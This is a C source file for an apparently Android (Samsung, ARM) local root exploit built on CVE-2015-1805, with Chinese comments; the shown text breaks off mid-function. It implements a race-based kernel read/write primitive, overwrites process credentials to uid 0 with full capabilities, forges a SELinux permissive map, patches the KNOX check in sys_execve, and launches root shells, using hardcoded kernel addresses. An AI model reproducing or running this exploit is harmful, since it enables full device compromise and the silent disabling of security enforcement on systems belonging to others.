/* SPDX-License-Identifier: GPL-3.0-or-later */

/*
 * ktool.c — CVE-2015-1805 内核读写工具（P4.3）
 *
 *   ktool dump <hexaddr> <len>      从内核地址读并 hexdump（len 64 对齐）
 *   ktool read <hexaddr> <len>      读并以 binary 打到 stdout
 *
 * 读：writev 方向。布局随 W 变：
 *   iov[0] = W（present 页）    iov[1] = 4080（zapper 页，缺页点）
 *   iov[2] = 4112 - W（present）
 *   第二轮 chars=4096 = (4096-W) + W → 越界 W 字节
 *   OOB 条目 siv[257+j] = {addr + 8j, 8}，j < W/8
 *
 * 编译：zig cc -target arm-linux-musleabi -static -O2 -pthread -o ktool ktool.c
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/stat.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <dirent.h>
#include <unistd.h>

struct cap_hdr { uint32_t version; int pid; };
struct cap_data { uint32_t eff, perm, inh; };

static void show_caps(const char *tag)
{
	struct cap_hdr h = { 0x20080522, 0 };
	struct cap_data d[2];

	memset(d, 0, sizeof(d));
	if (syscall(__NR_capget, &h, d) != 0) {
		printf("%s capget errno=%d\n", tag, errno);
		return;
	}
	printf("%s eff=%08x perm=%08x inh=%08x\n", tag,
	       d[0].eff, d[0].perm, d[0].inh);
}


#define NSEG      257
#define IOVECS    512
#define PG        4096
#define TOTAL     8192
#define MAXW      2040              /* OOB 最多 2040 字节（255 条 iovec） */

static struct iovec viv[IOVECS] __attribute__((aligned(64)));
static struct iovec siv[IOVECS] __attribute__((aligned(64)));

static unsigned char *p0, *p2, *pR, *wbuf, *rbuf;
static int pfd[2];
static int udpfd = -1;
static volatile int stop, ready;

static void pin(int cpu)
{
	cpu_set_t s;
	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	sched_setaffinity(0, sizeof(s), &s);
}

static void *zapper(void *a)
{
	(void)a;
	pin(1);
	ready = 1;
	while (!stop)
		madvise(pR, PG, MADV_DONTNEED);
	return NULL;
}

static void *spinner(void *a)
{
	(void)a;
	volatile unsigned long x = 0;
	for (unsigned long i = 0; i < 400000000UL && !stop; i++)
		x += i;
	return NULL;
}

static void spray(void)
{
	struct mmsghdr m;

	memset(&m, 0, sizeof(m));
	m.msg_hdr.msg_iov = siv;
	m.msg_hdr.msg_iovlen = IOVECS;
	m.msg_hdr.msg_control = siv;
	m.msg_hdr.msg_controllen = IOVECS * sizeof(struct iovec);
	syscall(SYS_sendmmsg, udpfd, &m, 1, MSG_DONTWAIT);
}

static int read_exact(int fd, unsigned char *buf, size_t n)
{
	size_t got = 0;
	int spins = 0;

	while (got < n) {
		ssize_t r = read(fd, buf + got, n - got);
		if (r > 0) { got += r; spins = 0; }
		else if (r < 0 && (errno == EAGAIN || errno == EINTR)) {
			if (++spins > 5000) return -1;
			usleep(1);
		} else return -1;
	}
	return 0;
}

static void drain(void)
{
	unsigned char t[256];
	while (read(pfd[0], t, sizeof(t)) > 0)
		;
}

/*
 * kread: 读 len 字节（8 的倍数，<= MAXW，且 W 需 <= 4080）
 * 返回 0 成功；-1 失败（目标地址不可读）
 */
static uint64_t *canary_pg;

static int kread(unsigned long addr, unsigned char *out, int len)
{
	int j, tries, w;
	uint64_t nonce;

	if (len <= 0 || len > 2000 || (len & 7)) {
		fprintf(stderr, "kread: bad len %d\n", len);
		return -1;
	}
	w = len + 8;                        /* OOB = canary(8) + data(len) */

	viv[0].iov_len = w;
	viv[1].iov_len = 4080;
	viv[2].iov_len = 4112 - w;

	for (j = 257; j < IOVECS; j++)
		siv[j].iov_len = 0;
	siv[257].iov_base = canary_pg;      /* 自校验：读回的第一个 8 字节必须等于它 */
	siv[257].iov_len = 8;
	for (j = 0; j < len / 8; j++) {
		siv[258 + j].iov_base = (void *)(addr + j * 8);
		siv[258 + j].iov_len = 8;
	}

	for (tries = 0; tries < 300; tries++) {
		ssize_t r;
		uint64_t got;

		nonce = 0x9e3779b97f4a7c15ULL * (uint64_t)(tries + 1)
			+ (uint64_t)addr + (uint64_t)len;
		*canary_pg = nonce;
		spray();
		r = writev(pfd[1], viv, NSEG);
		if (r == TOTAL) {
			if (read_exact(pfd[0], rbuf, TOTAL) != 0) return -1;
			memcpy(&got, rbuf + TOTAL - w, 8);
			if (got == nonce) {          /* canary 对上 → 残留确实是我们的 */
				memcpy(out, rbuf + TOTAL - w + 8, len);
				return 0;
			}
		} else {
			drain();
		}
	}
	return -1;
}

static int kwrite(unsigned long addr, const void *data, int len)
{
	int j, tries;

	if (len <= 0 || len > 4000 || (len & 7)) {
		fprintf(stderr, "kwrite: bad len %d\n", len);
		return -1;
	}
	viv[0].iov_len = len;
	viv[1].iov_len = 4080;
	viv[2].iov_len = 4112 - len;

	for (j = 257; j < IOVECS; j++)
		siv[j].iov_len = 0;
	for (j = 0; j < len / 8; j++) {
		siv[257 + j].iov_base = (void *)(addr + j * 8);
		siv[257 + j].iov_len = 8;
	}

	for (tries = 0; tries < 300; tries++) {
		ssize_t r;

		memset(wbuf, 0, TOTAL);
		memcpy(wbuf + TOTAL - len, data, len);
		spray();
		if (write(pfd[1], wbuf, TOTAL) != TOTAL) return -1;
		r = readv(pfd[0], viv, NSEG);
		if (r == TOTAL)
			return 0;
		drain();
	}
	return -1;
}

static int kwrite_verify(unsigned long addr, const void *data, int len)
{
	unsigned char b[64];
	int i;

	if (len > MAXW) return -1;
	for (i = 0; i < 30; i++) {
		if (kwrite(addr, data, len) == 0 &&
		    kread(addr, b, len) == 0 && !memcmp(b, data, len))
			return 0;
	}
	return -1;
}


#define PERM_BASE   0xc0b9ec3cUL   /* modprobe_path，256 字节可写 .data */
#define PERM_MAP    0xc0c4efccUL   /* policydb.permissive_map */
#define AVC_SLOTS   0xc0c4bc70UL   /* avc_cache.slots[512] */
#define EXEC_BR     0xc0012164UL   /* sys_execve 里的 KNOX 分支 */
#define EXEC_BR_ORIG 0x0a000002U   /* beq */
#define EXEC_BR_PATCH 0xea000047U  /* b 0xc0012288 → do_execve */
#define NNODES      8
#define NODE_SZ     32
#define NODE_BITS   192

static unsigned long find_self(void)
{
	unsigned char b[64];
	unsigned long ih = 0xc0b79be0UL, p = 0;
	uint32_t next;
	int i, attempt;

	for (attempt = 0; attempt < 6 && !p; attempt++) {
		if (kread(ih + 0x1c0, b, 64) != 0) continue;
		next = *(uint32_t *)(b + 0x14);      /* prev：从尾部反向走 */
		for (i = 0; i < 400 && next; i++) {
			unsigned long q = next - 0x1d0;
			if (kread(q + 0x300, b, 64) == 0 &&
			    !strncmp((char *)(b + 4), "ktool", 5)) { p = q; break; }
			if (kread(q + 0x1c0, b, 64) != 0) break;
			next = *(uint32_t *)(b + 0x14);
			if (next == ih + 0x1d0) break;
		}
	}
	return p;
}


/* 找 parent == 指定 task 的子任务。fork 后子进程的 real_parent 就是父进程，
 * 不依赖 pid/struct pid 的偏移链（0x260 是 struct pid*，nr 在 +0x1c，绕远）。 */
static unsigned long find_child_of(unsigned long parent_task)
{
	unsigned char b[64];
	unsigned long ih = 0xc0b79be0UL, p = 0;
	uint32_t next;
	int i, attempt;

	if (!parent_task) return 0;
	for (attempt = 0; attempt < 6 && !p; attempt++) {
		if (kread(ih + 0x1c0, b, 64) != 0) continue;
		next = *(uint32_t *)(b + 0x14);      /* prev：从尾部反向走 */
		for (i = 0; i < 200 && next; i++) {
			unsigned long q = next - 0x1d0;
			if (kread(q + 0x220, b, 64) == 0 &&
			    *(uint32_t *)(b + 0x0c) == parent_task) { p = q; break; }
			if (kread(q + 0x1c0, b, 64) != 0) break;
			next = *(uint32_t *)(b + 0x14);
			if (next == ih + 0x1d0) break;
		}
	}
	return p;
}

/* 给任意 task 提权：八个 ID 清零 + 四组 caps 全满。
 * 故意不校验原 uid —— 目标是 exec 之后生成的新 cred。 */
static int patch_task_cred(unsigned long task)
{
	unsigned char b[64];
	unsigned long rcred, cred;
	unsigned zeros[8] = {0};
	uint32_t full[2] = {0xffffffffU, 0xffffffffU};

	if (!task) return -1;
	if (kread(task + 0x2f8, b, 64) != 0) return -1;
	rcred = *(uint32_t *)b;
	cred  = *(uint32_t *)(b + 4);
	if (!cred) return -1;

	if (rcred && rcred != cred) {
		kwrite_verify(rcred + 0x28, full, 8);
		kwrite_verify(rcred + 0x30, full, 8);
		kwrite_verify(rcred + 0x38, full, 8);
		kwrite_verify(rcred + 0x40, full, 8);
		kwrite_verify(rcred + 4, zeros, 32);
	}
	kwrite_verify(cred + 0x28, full, 8);
	kwrite_verify(cred + 0x30, full, 8);
	kwrite_verify(cred + 0x38, full, 8);
	kwrite_verify(cred + 0x40, full, 8);
	return kwrite_verify(cred + 4, zeros, 32);
}

static int do_root(void)
{
	unsigned char b[64];
	unsigned long p, rcred, cred;
	unsigned zeros[8] = {0};
	uint32_t full[2] = {0xffffffffU, 0xffffffffU};
	int i;

	p = find_self();
	if (!p) { printf("task not found\n"); return -1; }
	if (kread(p + 0x2f8, b, 64) != 0) { printf("cred read fail\n"); return -1; }
	rcred = *(uint32_t *)(b);
	cred  = *(uint32_t *)(b + 4);
	if (kread(cred, b, 64) != 0) { printf("cred deref fail\n"); return -1; }
	for (i = 0; i < 8; i++) {
		uint32_t v = *(uint32_t *)(b + 4 + i * 4);
		if (v != 0x7d0) { printf("cred check FAIL +%x=%x\n", 4 + i*4, v); return -1; }
	}
	printf("task=%08lx cred=%08lx\n", p, cred);

	/* caps 先补：inheritable / permitted / effective / bset 全满 */
	if (kwrite_verify(cred + 0x28, full, 8) != 0 ||
	    kwrite_verify(cred + 0x30, full, 8) != 0 ||
	    kwrite_verify(cred + 0x38, full, 8) != 0 ||
	    kwrite_verify(cred + 0x40, full, 8) != 0) {
		printf("kwrite caps fail\n"); return -1;
	}
	show_caps("caps:");

	if (kwrite_verify(cred + 4, zeros, 32) != 0) { printf("kwrite uid fail\n"); return -1; }
	if (rcred && rcred != cred) {
		if (kread(rcred, b, 64) == 0 && *(uint32_t *)(b + 4) == 0x7d0) {
			kwrite_verify(rcred + 0x28, full, 8);
			kwrite_verify(rcred + 0x30, full, 8);
			kwrite_verify(rcred + 0x38, full, 8);
			kwrite_verify(rcred + 0x40, full, 8);
			kwrite_verify(rcred + 4, zeros, 32);
			printf("real_cred patched\n");
		}
	}
	printf("uid now: %d/%d/%d\n", (int)getuid(), (int)geteuid(), (int)getgid());
	show_caps("caps after uid:");
	return 0;
}

/* policydb.permissive_map 为空（node=NULL,highbit=0），往 modprobe_path 写一串
 * 全 1 的 ebitmap_node，再把 map 头指过去 → 所有 type 变成 permissive。
 * ALWAYS_ENFORCE 只去掉 selinux_enforcing 判断，avc_denied 仍认 AVD_FLAGS_PERMISSIVE。 */

/* 用「重载原厂策略」来失效 AVC 缓存：
 * 内核走 security_load_policy() -> avc_ss_reset()，全程持锁，不会破坏哈希链。
 * 副作用：policydb 被重置，permissive_map 自动变空 —— 正是我们要的状态。
 * 绝对不要像旧版那样直接 memset avc_cache.slots：那是无锁写活哈希表，
 * 与并发的 avc_insert 竞争会造出环链，avc_search_node 死循环 -> 看门狗重启。 */
static unsigned char policy_buf[512 * 1024];

static int reload_stock_policy(void)
{
	int in, out, n, total = 0;
	struct stat st;

	in = open("/sepolicy", O_RDONLY);
	if (in < 0) { printf("reload: open /sepolicy fail errno=%d\n", errno); return -1; }
	if (fstat(in, &st) == 0 && st.st_size > 0 && (size_t)st.st_size < sizeof(policy_buf)) {
		while (total < st.st_size) {
			n = read(in, policy_buf + total, st.st_size - total);
			if (n <= 0) break;
			total += n;
		}
	} else {
		while ((n = read(in, policy_buf + total, 65536)) > 0 &&
		       total < (int)sizeof(policy_buf) - 65536)
			total += n;
	}
	close(in);
	if (total <= 0) { printf("reload: read /sepolicy fail (%d)\n", total); return -1; }

	out = open("/sys/fs/selinux/load", O_WRONLY);
	if (out < 0) { printf("reload: open load fail errno=%d\n", errno); return -1; }
	n = write(out, policy_buf, total);
	close(out);
	if (n != total) { printf("reload: write fail errno=%d (%d/%d)\n", errno, n, total); return -1; }
	printf("policy reloaded (%d bytes), avc reset safely\n", total);
	return 0;
}

static int do_permissive(void)
{
	unsigned char buf[256], rb[256];
	unsigned int hdr[2];
	int i, j;

	memset(buf, 0, sizeof(buf));
	for (i = 0; i < NNODES; i++) {
		unsigned char *n = buf + i * NODE_SZ;
		unsigned int nx = (i == NNODES - 1) ? 0
				: (unsigned int)(PERM_BASE + (i + 1) * NODE_SZ);
		unsigned int sb = i * NODE_BITS;

		memcpy(n, &nx, 4);
		for (j = 0; j < 6; j++) {
			unsigned int f = 0xffffffffU;
			memcpy(n + 4 + j * 4, &f, 4);
		}
		memcpy(n + 28, &sb, 4);
	}
	if (kwrite_verify(PERM_BASE, buf, 256) != 0) { printf("write nodes fail\n"); return -1; }

	hdr[0] = PERM_BASE;
	hdr[1] = NNODES * NODE_BITS;
	if (kwrite_verify(PERM_MAP, hdr, 8) != 0) { printf("write map fail\n"); return -1; }
	if (kread(PERM_MAP, rb, 8) != 0 || memcmp(rb, hdr, 8)) {
		printf("map verify fail\n"); return -1;
	}
	printf("permissive_map: node=%08x highbit=%u\n", hdr[0], hdr[1]);
	printf("note: 已有缓存的拒绝不会失效（重启可清）；新三元组即时生效\n");
	return 0;
}

/* Samsung 在 sys_execve 入口加的限制：
 *   c0012164: beq 0xc0012174  (cred 六个 id 任一为 0 则进入 KNOX 检查块)
 * 检查块里 sec_check_execpath(mm,"/data/") 命中就 printk 并 return -EACCES。
 * 改成无条件 b 0xc0012288，直接进 do_execve。 */
static int do_patch_exec(int on)
{
	unsigned char b[8];
	int i;
	uint32_t cur, want = on ? EXEC_BR_PATCH : EXEC_BR_ORIG;
	uint32_t pair[2];

	for (i = 0; i < 3; i++)
		if (kread(EXEC_BR, b, 8) == 0)
			break;
	if (i == 3) { printf("read branch fail\n"); return -1; }
	cur = *(uint32_t *)b;
	if (cur == want) { printf("exec patch already %s\n", on ? "on" : "off"); return 0; }
	if (cur != EXEC_BR_ORIG && cur != EXEC_BR_PATCH) {
		printf("unexpected insn %08x @%08lx, refuse\n", cur, EXEC_BR);
		return -1;
	}
	pair[0] = want;
	pair[1] = *(uint32_t *)(b + 4);
	if (kwrite_verify(EXEC_BR, pair, 8) != 0) { printf("patch write fail\n"); return -1; }
	if (kread(EXEC_BR, b, 8) != 0 || *(uint32_t *)b != want) {
		printf("patch verify fail\n"); return -1;
	}
	printf("exec patch %s (%08x -> %08x)\n",
	       on ? "applied" : "reverted", cur, want);
	return 0;
}


/* 把 permissive_map 恢复成空、modprobe_path 还原、AVC 清桶，
 * 让系统回到正常的 enforcing 语义（不动 selinux_enforcing，避免 TIMA 告警）。 */
static int do_unperm(void)
{
	unsigned int hdr[2] = {0, 0};
	unsigned char mp[256];

	/* 只把 permissive_map 清零，不动 avc_cache。
	 * 旧缓存里带 PERMISSIVE 标志的条目会一直有效到重启——这是刻意的取舍：
	 * 无锁写活哈希表会造成环链，avc_search_node 死循环，看门狗重启（已实测）。 */
	if (kwrite_verify(PERM_MAP, hdr, 8) != 0) { printf("restore permissive_map fail\n"); return -1; }

	memset(mp, 0, sizeof(mp));
	strcpy((char *)mp, "/sbin/modprobe");
	if (kwrite_verify(PERM_BASE, mp, 256) != 0) { printf("restore modprobe_path fail\n"); return -1; }

	printf("permissive_map cleared, modprobe_path restored\n");
	printf("note: 已缓存的三元组仍是 permissive，彻底恢复请重启\n");
	return 0;
}

static void show_mem(const char *tag)
{
	FILE *f = fopen("/proc/meminfo", "r");
	char line[256];
	unsigned long mt = 0, mf = 0, ca = 0, sl = 0, sw = 0, sf = 0;

	if (f) {
		while (fgets(line, sizeof(line), f)) {
			if (!strncmp(line, "MemTotal:", 9)) sscanf(line + 9, "%lu", &mt);
			else if (!strncmp(line, "MemFree:", 8)) sscanf(line + 8, "%lu", &mf);
			else if (!strncmp(line, "Cached:", 7)) sscanf(line + 7, "%lu", &ca);
			else if (!strncmp(line, "Slab:", 5)) sscanf(line + 5, "%lu", &sl);
			else if (!strncmp(line, "SwapTotal:", 10)) sscanf(line + 10, "%lu", &sw);
			else if (!strncmp(line, "SwapFree:", 9)) sscanf(line + 9, "%lu", &sf);
		}
		fclose(f);
	}
	printf("%s MemTotal=%luK MemFree=%luK Cached=%luK Slab=%luK SwapUsed=%luK\n",
	       tag, mt, mf, ca, sl, sw - sf);
}

static void show_audit(const char *tag)
{
	struct stat st;
	int n = 0, i;
	DIR *d;

	if (stat("/data/misc/audit/audit.log", &st) == 0)
		printf("%s audit.log=%ld bytes\n", tag, (long)st.st_size);

	d = opendir("/proc");
	if (d) {
		struct dirent *e;
		while ((e = readdir(d)))
			if (e->d_name[0] >= '0' && e->d_name[0] <= '9')
				n++;
		closedir(d);
	}
	printf("%s procs=%d\n", tag, n);
	(void)i;
}

int main(int argc, char **argv)
{
	int i;
	pthread_t th[3];
	unsigned long addr;
	int len;

	if (argc < 2) {
		fprintf(stderr, "usage: %s dump <hexaddr> <len> | find <comm> | root | pwn [cmd] | permissive\n", argv[0]);
		return 1;
	}
	addr = 0; len = 0;
	if (!strcmp(argv[1], "dump") || !strcmp(argv[1], "read")) {
		if (argc < 4) { fprintf(stderr, "need addr len\n"); return 1; }
		addr = strtoul(argv[2], NULL, 16);
		len = atoi(argv[3]);
		if (len <= 0 || len > 4096) { fprintf(stderr, "bad len\n"); return 1; }
	}

	for (i = 0; i < 2; i++)
		pthread_create(&th[i], NULL, spinner, NULL);
	sleep(2);

	if (pipe(pfd) != 0) { perror("pipe"); return 1; }
	fcntl(pfd[0], F_SETFL, fcntl(pfd[0], F_GETFL) | O_NONBLOCK);

	p0 = mmap(NULL, PG, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	p2 = mmap(NULL, PG, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	pR = mmap(NULL, PG, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	wbuf = mmap(NULL, TOTAL, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	rbuf = mmap(NULL, TOTAL, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	canary_pg = mmap(NULL, PG, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (!p0 || !p2 || !pR || !wbuf || !rbuf || !canary_pg) { perror("mmap"); return 1; }
	memset(wbuf, 0xA5, TOTAL);

	memset(viv, 0, sizeof(viv));
	viv[0].iov_base = p0;
	viv[1].iov_base = pR;
	viv[2].iov_base = p2;

	memset(siv, 0, sizeof(siv));

	udpfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (udpfd < 0) { perror("socket"); return 1; }
	{
		struct sockaddr_in sa;
		memset(&sa, 0, sizeof(sa));
		sa.sin_family = AF_INET;
		sa.sin_port = htons(5105);
		sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
		connect(udpfd, (struct sockaddr *)&sa, sizeof(sa));
	}

	pthread_create(&th[2], NULL, zapper, NULL);
	while (!ready) usleep(200);
	pin(0);

	if (!strcmp(argv[1], "find")) {
		unsigned char b[64];
		unsigned long p, ih = 0xc0b79be0UL, cred = 0, rcred = 0;
		uint32_t next;
		int i, found = 0;

		if (kread(ih + 0x1c0, b, 64) != 0) return 2;
		next = *(uint32_t *)(b + 0x14);   /* prev：从尾部反向走 */      /* tasks.next */
		for (i = 0; i < 400 && next; i++) {
			p = next - 0x1d0;
			if (kread(p + 0x300, b, 64) == 0 &&
			    !strncmp((char *)(b + 4), argv[2], strlen(argv[2]))) {
				printf("FOUND task=%08lx comm=%s\n", p, b + 4);
				found = 1;
				break;
			}
			if (kread(p + 0x1c0, b, 64) != 0) { printf("next-read fail i=%d p=%08lx\n", i, p); break; }
			next = *(uint32_t *)(b + 0x14);   /* prev：从尾部反向走 */
			printf("  [%d] p=%08lx next=%08x\n", i, p, next);
			if (next == ih + 0x1d0) break;
		}
		if (!found) { printf("not found after %d\n", i); return 2; }
		if (kread(p + 0x2f8, b, 64) == 0) {
			rcred = *(uint32_t *)b;
			cred = *(uint32_t *)(b + 4);
			printf("real_cred=%08lx cred=%08lx\n", rcred, cred);
		}
		if (cred && kread(cred, b, 64) == 0) {
			for (i = 0; i < 64; i += 8)
				printf("cred+%02x: %08x %08x\n", i,
				       *(uint32_t *)(b + i), *(uint32_t *)(b + i + 4));
		}
		return 0;
	}

	if (!strcmp(argv[1], "root") || !strcmp(argv[1], "pwn")) {
		int want_perm = !strcmp(argv[1], "pwn");

		fflush(stdout);
		if (do_root() != 0) return 3;
		if (want_perm && do_permissive() != 0) return 3;
		fflush(stdout);

		if (want_perm) {
			if (argc > 2) {
				int fd;
				errno = 0;
				fd = open(argv[2], O_RDONLY);
				printf("probe: open(%s)=%d errno=%d\n", argv[2], fd, errno);
				if (fd >= 0) close(fd);
				errno = 0;
				printf("probe: access(X_OK)=%d errno=%d uid=%d\n",
				       access(argv[2], X_OK), errno, (int)getuid());
				fflush(stdout);
				execvp(argv[2], &argv[2]);
				printf("execvp errno=%d\n", errno);
			} else {
				char *av[2];
				av[0] = "/system/bin/sh";
				av[1] = NULL;
				execv(av[0], av);
				perror("execv");
			}
			_exit(1);
		}
		if (argc > 2) {
			execvp(argv[2], &argv[2]);
			perror("execvp");
		}
		_exit(0);
	}

	if (!strcmp(argv[1], "idel")) {
		unsigned char b[64];
		unsigned long p2;
		int k;

		if (do_root() != 0) return 3;
		for (k = 0; k < 5; k++) {
			printf("[%d] uid=%d euid=%d", k, (int)getuid(), (int)geteuid());
			p2 = find_self();
			if (p2 && kread(p2 + 0x2f8, b, 64) == 0) {
				unsigned long c = *(uint32_t *)(b + 4);
				if (kread(c, b, 16) == 0)
					printf("  cred[%08lx].uid=%u", c, *(uint32_t *)(b + 4));
			}
			printf("\n");
			fflush(stdout);
			sleep(1);
		}
		return 0;
	}

	if (!strcmp(argv[1], "x")) {
		execvp(argv[2], &argv[2]);
		printf("execvp errno=%d\n", errno);
		return 3;
	}

	if (!strcmp(argv[1], "setuid")) {
		unsigned char b[64];
		unsigned long p2, c2;
		uint32_t v = strtoul(argv[2], NULL, 0);
		uint32_t ids[8];
		int k;

		p2 = find_self();
		if (!p2) { printf("task not found\n"); return 3; }
		if (kread(p2 + 0x2f8, b, 64) != 0) return 3;
		c2 = *(uint32_t *)(b + 4);
		for (k = 0; k < 8; k++) ids[k] = v;
		if (kwrite_verify(c2 + 4, ids, 32) != 0) { printf("write fail\n"); return 3; }
		printf("uid=%d euid=%d\n", (int)getuid(), (int)geteuid());
		if (argc > 3) {
			execvp(argv[3], &argv[3]);
			printf("exec errno=%d\n", errno);
		}
		return 0;
	}

	if (!strcmp(argv[1], "sh")) {
		char *av[64];
		int n = 0, k, st = 0;
		pid_t cpid;

		av[n++] = "/system/bin/sh";
		for (k = 2; k < argc && n < 63; k++)
			av[n++] = argv[k];
		av[n] = NULL;

		/* MAC 先放开：子进程里跑的每条命令都要过 AVC */
		do_permissive();
		fflush(stdout);

		cpid = fork();
		if (cpid < 0) { perror("fork"); return 3; }
		if (cpid == 0) {
			chdir("/");
			/* 关键：exec 时 uid 仍是 2000，不触发 KNOX 的
			 * "六个 ID 有 0" 分支，所以从 /data 启动也不被拦。
			 * PTRACE_TRACEME 让 exec 成功后在入口处停住，
			 * 父进程借此确认 cred 已换成 exec 后的新副本。 */
			if (ptrace(PTRACE_TRACEME, 0, 0, 0) != 0)
				_exit(126);
			execve(av[0], av, environ);
			_exit(127);
		}

		if (waitpid(cpid, &st, 0) > 0 && WIFSTOPPED(st)) {
			unsigned long me = find_self();
			{
				unsigned char q[8];
				unsigned long mms = 0, mmc = 0, fs = 0, fc = 0, t;
				if (kread(me + 0x1ec, q, 8) == 0) mms = *(uint32_t *)q;
				if (mms && kread(mms + 0x188, q, 8) == 0) fs = *(uint32_t *)q;
				t = find_child_of(me);
				if (t) {
					if (kread(t + 0x1ec, q, 8) == 0) mmc = *(uint32_t *)q;
					if (mmc && kread(mmc + 0x188, q, 8) == 0) fc = *(uint32_t *)q;
				}
				printf("[dbg] self mm=%08lx exe=%08lx | child mm=%08lx exe=%08lx\n",
				       mms, fs, mmc, fc);
				{
					unsigned char q2[16];
					unsigned long fsv = 0, fsv2 = 0;
					if (kread(t + 0x1f4, q2, 8) == 0) fsv = *(uint32_t *)q2;
					if (kread(t + 0x1f8, q2, 8) == 0) fsv2 = *(uint32_t *)q2;
					printf("[dbg] t+1f4=%08lx t+1f8=%08lx\n", fsv, fsv2);
					if (fsv > 0xc0000000UL && fsv < 0xf0000000UL) {
						unsigned long rden = 0;
						if (kread(fsv + 0x14, q2, 8) == 0) rden = *(uint32_t *)(q2 + 4);
						printf("[dbg] fs+0x10 root.dentry?=%08lx\n", rden);
					}
				}
				if (fc) {
					unsigned char nb[32];
					uint32_t den = 0, nlen = 0, nptr = 0;
					if (kread(fc + 8, nb, 8) == 0) { den = *(uint32_t *)(nb + 4); printf("[dbg] mnt=%08x ", *(uint32_t *)nb); }
					printf("[dbg] dentry=%08x ", den);
					if (den && kread(den + 0x14, nb, 16) == 0) {
						nlen = *(uint32_t *)(nb + 4);
						nptr = *(uint32_t *)(nb + 8);
						printf("len=%u ptr=%08x ", nlen, nptr);
						if (nptr && nlen < 32 && kread(nptr, nb, 32) == 0) {
							nb[nlen < 31 ? nlen : 31] = 0;
							printf("name=%s", nb);
						}
					}
					printf("\n");
					{
						char cb[16];
						unsigned long pd = den;
						int lvl;
						if (kread(t + 0x304, cb, 16) == 0) {
							cb[15] = 0;
							printf("[dbg] child comm=%s\n", cb);
						}
						for (lvl = 0; lvl < 7 && pd; lvl++) {
							unsigned char q3[16];
							uint32_t par = 0, ln = 0, np = 0;
							char nm[32];
							if (kread(pd + 0x10, q3, 16) != 0) break;
							par = *(uint32_t *)q3;
							ln  = *(uint32_t *)(q3 + 8);
							np  = *(uint32_t *)(q3 + 12);
							memset(nm, 0, sizeof(nm));
							if (np && ln < 31) kread(np, nm, 32);
							nm[31] = 0;
							printf("[path] %d dentry=%08lx name=%s parent=%08lx\n",
							       lvl, pd, nm, par);
							if (!par || par == pd) break;
							pd = par;
						}
					}
				}
			}
			unsigned long t = find_child_of(me);
			if (patch_task_cred(t) == 0)
				printf("[+] child pid %d -> uid 0\n", (int)cpid);
			else
				printf("[!] patch failed (task=%08lx)\n", t);
			fflush(stdout);
			ptrace(PTRACE_DETACH, cpid, 0, 0);
		} else if (WIFEXITED(st)) {
			int code = WEXITSTATUS(st);
			printf("[!] %s\n", code == 126 ? "ptrace denied" :
			       code == 127 ? "exec failed" : "child exited");
			return 3;
		}

		waitpid(cpid, &st, 0);
		_exit(0);
	}

	if (!strcmp(argv[1], "ls") || !strcmp(argv[1], "cat") ||
	    !strcmp(argv[1], "cp")) {
		int isls = !strcmp(argv[1], "ls");
		int iscat = !strcmp(argv[1], "cat");

		if (do_root() != 0) return 3;
		if (do_permissive() != 0) return 3;
		fflush(stdout);

		if (isls) {
			DIR *d = opendir(argv[2]);
			struct dirent *e;
			if (!d) { printf("opendir: %d\n", errno); return 3; }
			while ((e = readdir(d)))
				printf("%s\n", e->d_name);
			closedir(d);
			return 0;
		}
		if (iscat) {
			int fd = open(argv[2], O_RDONLY), n;
			char buf[4096];
			if (fd < 0) { printf("open: %d\n", errno); return 3; }
			while ((n = read(fd, buf, sizeof(buf))) > 0) {
				if (write(1, buf, n) != n) break;
			}
			close(fd);
			return 0;
		}
		{
			int in = open(argv[2], O_RDONLY);
			int out, n;
			char buf[8192];
			if (in < 0) { printf("open src: %d\n", errno); return 3; }
			out = open(argv[3], O_WRONLY | O_CREAT | O_TRUNC, 0666);
			if (out < 0) { printf("open dst: %d\n", errno); return 3; }
			while ((n = read(in, buf, sizeof(buf))) > 0) {
				if (write(out, buf, n) != n) { printf("write fail\n"); break; }
				in;
			}
			close(in); close(out);
			chmod(argv[3], 0755);
			printf("copied\n");
			return 0;
		}
	}

	if (!strcmp(argv[1], "rawexec")) {
		unsigned char b[64];
		unsigned long p2, c2;
		uint32_t ids[8] = {0};
		char *av[2];
		int k;

		if (!strcmp(argv[2], "root")) {
			p2 = find_self();
			if (!p2) { printf("task not found\n"); return 3; }
			if (kread(p2 + 0x2f8, b, 64) != 0) return 3;
			c2 = *(uint32_t *)(b + 4);
			for (k = 0; k < 8; k++) ids[k] = 0;
			kwrite_verify(c2 + 4, ids, 32);
			printf("uid=%d\n", (int)getuid());
			argv[2] = argv[2];   /* no-op */
			av[0] = argv[3];
			av[1] = NULL;
			syscall(__NR_execve, argv[3], av, environ);
			printf("rawexec errno=%d\n", errno);
			return 0;
		}
		av[0] = argv[2];
		av[1] = NULL;
		syscall(__NR_execve, argv[2], av, environ);
		printf("rawexec errno=%d\n", errno);
		return 0;
	}

	if (!strcmp(argv[1], "who")) {
		printf("who: uid=%d euid=%d gid=%d egid=%d\n",
		       (int)getuid(), (int)geteuid(), (int)getgid(), (int)getegid());
		show_caps("who caps");
		return 0;
	}

	if (!strcmp(argv[1], "w32")) {
		unsigned long a = strtoul(argv[2], NULL, 16);
		uint32_t v = strtoul(argv[3], NULL, 0);
		unsigned char b[8];
		uint32_t pair[2];

		if (kread(a, b, 8) != 0) { printf("read fail\n"); return 3; }
		pair[0] = v;
		pair[1] = *(uint32_t *)(b + 4);
		if (kwrite_verify(a, pair, 8) != 0) { printf("write fail\n"); return 3; }
